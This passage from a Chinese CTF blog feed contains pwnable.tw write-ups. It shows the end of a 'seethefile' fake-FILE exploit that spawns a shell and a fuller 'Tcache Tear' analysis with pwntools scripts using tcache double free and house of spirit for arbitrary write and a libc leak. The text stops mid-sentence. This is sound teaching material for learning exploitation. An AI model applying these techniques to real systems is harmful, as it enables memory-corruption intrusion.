class="comment">################################################</span></span><br><span class="line"></span><br><span class="line">openfile = <span class="keyword">lambda</span> name : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"see :"</span>, name))</span><br><span class="line">readfile = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">writefile = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line">printname = <span class="keyword">lambda</span> name : (sla(<span class="string">"choice :"</span>,<span class="string">"5"</span>),sla(<span class="string">"name :"</span>, name))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">openfile(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">io.recvuntil(<span class="string">"[heap]\n"</span>)</span><br><span class="line">libc_addr = int(io.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">system_addr = libc_addr +libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># make fake file</span></span><br><span class="line">fakeFILE = <span class="number">0x0804B284</span></span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(fakeFILE)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">";$0"</span>+<span class="string">'\x00'</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(system_addr)*<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">printname(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 seethefile</a></li><li><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/" target="_blank" rel="noopener">pwnable.tw系列</a></li><li><a href="https://blog.csdn.net/qq_43189757/article/details/103056493" target="_blank" rel="noopener">pwnable.tw seethefile 经验总结</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.tw-TcacheTear-tcache-dupANDhouse-of-spiritAND__free_hook</title>
      <link href="2020/11/26/pwnable-tw-TcacheTear-tcache-dupANDhouse-of-spiritAND-free-hook/"/>
      <url>2020/11/26/pwnable-tw-TcacheTear-tcache-dupANDhouse-of-spiritAND-free-hook/</url>
      
        <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file tcache_tear </span><br><span class="line">tcache_tear: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br><span class="line">$ checksec tcache_tear </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>64位动态链接，去符号表，got表不可写，更优雅的查看libc版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc-tcache.so | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br></pre></td></tr></table></figure><p>为libc 2.27，去glibc-all-in-one下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd glibc-all-in-one&#x2F;</span><br><span class="line">$ cat list</span><br><span class="line">$ .&#x2F;download 2.27-3ubuntu1_amd64</span><br></pre></td></tr></table></figure><p>比较这两个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ diff glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc-2.27.so libc-tcache.so</span><br></pre></td></tr></table></figure><p>完全一样，所以我们只需要让题目文件指向我们的libc即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ patchelf  --set-rpath ~&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F; tcache_tear </span><br><span class="line">$ patchelf --set-interpreter ~&#x2F;Desktop&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;ld-2.27.so tcache_tear</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>运行发现是首先是输入一个名字，然后还是菜单，malloc，free和info，不过free并没有指定目标序号，还是IDA直接进行分析。需要注意的是，IDA分析出了main函数，并不意味着main这个函数符号没被去掉，可以发现gdb并无法对main函数打断，所以IDA分析出的main函数是从libc_start_main的参数推算出来的。分析后对以下函数重命名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_400948 -&gt; init_</span><br><span class="line">sub_400A25 -&gt; read_string</span><br><span class="line">sub_400A9C -&gt; menu</span><br><span class="line">sub_4009C4 -&gt; read_num</span><br><span class="line">sub_400B99 -&gt; info</span><br><span class="line">sub_400B14 -&gt; add</span><br><span class="line">unk_602060 -&gt; name</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init_();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name:"</span>, a2);</span><br><span class="line">  read_string((__int64)&amp;name, <span class="number">0x20</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = read_num();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        info();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序会先读取用户输入最长为0x20的字符串放到bss段，然后进入主循环，值得注意的是：</p><ul><li>info是打印name的那个bss字段，固定输出0x20个字节</li><li>free函数的参数是一个固定在bss段的全局变量，而且free后没清零</li><li>最多可以free 8次</li></ul><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  v0 = read_num();</span><br><span class="line">  <span class="built_in">size</span> = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(v0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">    read_string((__int64)ptr, <span class="built_in">size</span> - <span class="number">16</span>);</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数可以任意申请大小小于0xff的堆块并填写size-0x10大小的内容，然后返回堆块地址到ptr这个bss段的全局变量上，ptr只能保存最后一个申请的堆块的地址。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul><li>在free后，没有对指针进行清零，导致存在悬空指针。一个堆块可以free多次，存在UAF。</li><li>在add函数中，malloc后使用read_string函数进行输入的参数为<code>size - 16</code>，如果size为小于16的正数，得到的结果被转换为无符号整数参数就可以读入大于堆块size的数据，导致堆溢出</li></ul><p>不过后文中第二个漏洞并没有用到</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>可以参考ctf-wiki上的内容</p><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/" target="_blank" rel="noopener">tcache</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">Tcache Attack</a></li></ul><p>简单的来说，tcache就是为了追求效率，实现的一个更简单，更没啥校验，更大的fastbin</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="tcache-dup构造任意地址写"><a href="#tcache-dup构造任意地址写" class="headerlink" title="tcache dup构造任意地址写"></a>tcache dup构造任意地址写</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup" target="_blank" rel="noopener">tcache-dup</a></li></ul><p>简单来说就是double free，而且并没有检验，所以我们可以直接这样利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,addr)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>,data)</span><br></pre></td></tr></table></figure><p>我们来测试一下，利用tcache修改我们的名字：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./tcache_tear"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-tcache.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./tcache_tear"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-tcache.so"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10207</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line">init = <span class="keyword">lambda</span> name : sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc = <span class="keyword">lambda</span> size,data : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"Size:"</span>, str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">info = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">len = <span class="number">0x50</span></span><br><span class="line">name_bss = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">init(<span class="string">"0bs3rver"</span>)</span><br><span class="line">malloc(len,<span class="string">"aaa"</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(len,p64(name_bss))</span><br><span class="line">malloc(len,<span class="string">"aaa"</span>)</span><br><span class="line">malloc(len,<span class="string">"root"</span>)</span><br><span class="line">info()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本可以发现已经打印出了root，证明我们已经获得了任意地址写任意值的能力</p><p>接下来我们需要的就是找到能控制程序流的内存数据，然后修改掉，我们一般有如下选择：</p><ul><li>程序自己实现的函数指针</li><li>GOT表</li><li>fini_array段函数指针</li><li>libc中的函数指针</li></ul><p>不过我们发现：</p><ul><li>程序自己没有什么函数指针</li><li>GOT表不可写</li><li>main函数是个死循环，不会返回到libc_start_main，进而执行到fini_array段注册的函数</li></ul><p>故只好泄露libc基址，进而去修改libc中可以被调用的函数指针</p><h3 id="构造伪堆块泄露libc"><a href="#构造伪堆块泄露libc" class="headerlink" title="构造伪堆块泄露libc"></a>构造伪堆块泄露libc</h3><h4 id="tcache泄露libc常规办法"><a href="#tcache泄露libc常规办法" class="headerlink" title="tcache泄露libc常规办法"></a>tcache泄露libc常规办法</h4><p>我们leak的能力目前只有info，想要泄漏出libc地址可以通过堆管理器的双向链表的机制进行泄露，我们只要把堆块想办法搞到unsorted bin这种双向链表里，在想办法读到堆块的数据即可。绕过tcache使得堆块free后进入unsorted bin的方式通常有两种：</p><ol><li>每个tcache链上默认最多包含7个块，再次free这个大小的堆块将会进入其他bin中，例如<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#libc-leak" target="_blank" rel="noopener">tcache_attack/libc-leak</a></li><li>默认情况下，tcache中的单链表个数是64个，64位下可容纳的最大内存块大小是1032（0x408），故只要申请一个size大于0x408的堆块，然后free即可</li></ol><p>但是本题均无法直接做到：</p><ol><li>在free处做了限制，最多free七次，无法填满tcache的一条单链</li><li>在add函数中，无法申请大于0xff的堆块</li></ol><h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h4><p>house of spirit 技术的核心原理是在目标位置处伪造一个chunk，并将其释放，从而达到分配<strong>指定地址</strong>的chunk的目的，<strong>成功的关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">fashbin house-of-spirit</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-house-of-spirit" target="_blank" rel="noopener">tcache house-of-spirit</a></li></ul><p>放到本题中，利用思路就是：</p><ol><li>利用任意地址写，在bss段构造大小超出0x408的伪堆块</li><li>然后free掉，使其进入unsorted bin中</li><li>利用info函数，读取其内容即可</li></ol><p>需要注意的是我们<strong>除了要伪造的size要大于0x408，并且伪堆块后面的数据也要满足基本的堆块格式，而且至少两块。</strong>因为在free时，会对当前的堆块后面的堆块进行一系列检查：</p><blockquote><p><a href="https://github.com/lattera/glibc/blob/master/malloc/malloc.c" target="_blank" rel="noopener">https://github.com/lattera/glibc/blob/master/malloc/malloc.c</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 在 _int_free 函数中</span><br><span class="line">if (nextchunk !&#x3D; av-&gt;top) &#123;</span><br><span class="line">  &#x2F;* get and clear inuse bit *&#x2F;</span><br><span class="line">  nextinuse &#x3D; inuse_bit_at_offset(nextchunk, nextsize);</span><br></pre></td></tr></table></figure><p>可以看到free函数对当前的堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的inuse位，这一位的信息在nextchunk的nextchunk中，所以在这里我们总共要伪造三个堆块。第一个堆块我们构造大小为0x500，第二个和第三个分别构造为0x20大小的堆块，这些堆块的标记位，均为只置prev_inuse为1，使得free不去进行合并操作。如图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                        bss</span><br><span class="line"></span><br><span class="line">name  +------------&gt; +--------+ +------------+</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+</span><br><span class="line">                     |  0x501 |</span><br><span class="line">ptr   +------------&gt; +--------+</span><br><span class="line">                     |        |</span><br><span class="line">free(ptr);           |        |</span><br><span class="line">                     |        |  fake chunk 1</span><br><span class="line">                     |        |</span><br><span class="line">                     |        |</span><br><span class="line">                     |        |</span><br><span class="line">                     |        |</span><br><span class="line">                     |        |</span><br><span class="line">                     |        |</span><br><span class="line">name + 0x500  +----&gt; +--------+ +------------+</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+</span><br><span class="line">                     |  0x21  |</span><br><span class="line">                     +--------+  fake chunk 2</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+ +------------+</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+</span><br><span class="line">                     |  0x21  |</span><br><span class="line">                     +--------+  fake chunk 3</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+</span><br><span class="line">                     |   0    |</span><br><span class="line">                     +--------+ +------------+</span><br></pre></td></tr></table></figure><blockquote><p>复习：堆块的第一个0为pre_size，即前一个chunk的大小，第二个为chunk_size，即当前chunk大小，有8字节对齐，后三位分别为：A(是否为main_arena,即主线程)、M(该chunk是否由mmap分配)，P(前一个chunk是否被分配，故经常会看到chunk_size比chunk大1字节)，而用户申请得到的指针直接指向数据处</p></blockquote><p>我们可以使用如下策略：</p><ol><li>在最开始输入name时，直接构造好chunk1的前16个字节</li><li>然后利用任意地址写构造name+0x500的后两个伪堆块</li><li>再次利用任意地址写，向name+0x10写任意数据，目的是执行完最后一个malloc，ptr全局变量会被更新为name+0x10</li><li>free即可将这个堆块送入unsorted bin中</li><li>使用info函数读取name前0x20字节的内容，即可泄露unsorted bin地址</li><li>本地调试unsorted bin得出偏移</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">elf = ELF(<span class="string">"./tcache_tear"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-tcache.so"</span>)</span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">elf = ELF(<span class="string">"./tcache_tear"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-tcache.so"</span>)</span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10207</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line">s = io.send                                    <span class="comment">#</span></span><br><span class="line">sl = io.sendline                               <span class="comment">#</span></span><br><span class="line">sa = io.sendafter                              <span class="comment">#</span></span><br><span class="line">sla = io.sendlineafter                         <span class="comment">#</span></span><br><span class="line">r = io.recv                                    <span class="comment">#</span></span><br><span class="line">rl = io.recvline                               <span class="comment">#</span></span><br><span class="line">ru = io.recvuntil                              <span class="comment">#</span></span><br><span class="line">it = io.interactive                            <span class="comment">#</span></span><br><span class="line"><span class="comment">################################################</span></span><br><span class="line"></span><br><span class="line">init = <span class="keyword">lambda</span> name : sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc = <span class="keyword">lambda</span> size,data : (sla(<span class="string">"choice :"</span>,<span class="string">"1"</span>),sla(<span class="string">"Size:"</span>, str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"2"</span>)</span><br><span class="line">info = <span class="keyword">lambda</span> : sla(<span class="string">"choice :"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">    malloc(len,<span class="string">"aaa"</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    malloc(len,p64(addr))</span><br><span class="line">    malloc(len,<span class="string">"aaa"</span>)</span><br><span class="line">    malloc(len,data)</span><br><span class="line">    </span><br><span class="line">name_bss = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">init(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">aaw(<span class="number">0x50</span>,name_bss+<span class="number">0x500</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line">aaw(<span class="number">0x60</span>,name_bss+<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">info()</span><br><span class="line">io.recvuntil(<span class="string">"Name :"</span>); io.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">log.warn(<span class="string">"leak:0x%x"</span>%libc_addr)</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">'b * 0x400c07'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里采用：<code>io.recvuntil(&quot;Name :&quot;); io.recv(0x10)</code>，而不直接采用：<code>io.recv(0x16)</code>的原因是，<code>Name :</code>这6个字符和后面的内容是两条语句打印，在远程攻击的时候可能会出现数据先后到达延迟的io问题。</p><p>需要注意的是，我们这里使用的是glibc-all-in-one + patchelf 得到的glibc 2.27的环境，虽然我们gdb tcache_tear时glibc地址每次都一样，但是我们运行时glibc的基址是会变化的，所以我们需要脚本输出后直接进入gdb用vmmap来得到基址并计算偏移</p><p>本地调试得到偏移为 